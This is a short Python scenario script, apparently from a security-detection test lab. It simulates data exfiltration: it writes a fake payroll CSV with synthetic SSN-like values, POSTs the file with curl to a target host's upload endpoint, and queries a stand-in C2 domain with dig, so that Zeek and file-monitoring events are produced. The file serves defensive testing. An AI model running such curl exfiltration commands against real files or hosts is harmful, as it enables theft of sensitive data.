"""data-exfil scenario — FIM + zeek.http + zeek.dns + zeek.conn.

Drops a sensitive-looking file in /victim-data, POSTs it to victim-server,
then issues a DNS query to a low-rep domain. Each step is visible to a
different normalizer.
"""
from __future__ import annotations

import os
import subprocess
import time


NAME = "data-exfil"
DESCRIPTION = "Multi-layer chain: write sensitive file, exfil via HTTP POST, DNS lookup to low-rep domain"

VICTIM_DATA = "/victim-data"


def run(target_host: str) -> None:
    # 1. Write an 8 KB sensitive-looking CSV — FIM `created` event
    os.makedirs(VICTIM_DATA, exist_ok=True)
    suffix = int(time.time())
    file_path = os.path.join(VICTIM_DATA, f"sensitive_2026q2_payroll_{suffix}.csv")
    with open(file_path, "w") as f:
        f.write("employee_id,name,ssn,salary,bonus\n")
        # ~8 KB of plausible CSV-shaped junk
        for i in range(200):
            f.write(f"{1000 + i},Employee {i},123-45-{6000 + i:04d},{50000 + i * 10},{i * 7}\n")

    # 2. curl POST the file to victim-server — zeek.http event
    subprocess.run(
        [
            "curl", "-s", "-X", "POST",
            "-H", "Content-Type: text/csv",
            "--data-binary", f"@{file_path}",
            f"http://{target_host}/upload",
        ],
        check=False,
        timeout=10,
    )

    # 3. dig a .invalid (NXDOMAIN-guaranteed) domain through victim-server — zeek.dns event
    subprocess.run(
        ["dig", "+short", "+time=2", "+tries=1", "suspicious-c2-test.invalid", f"@{target_host}"],
        check=False,
        timeout=5,
    )
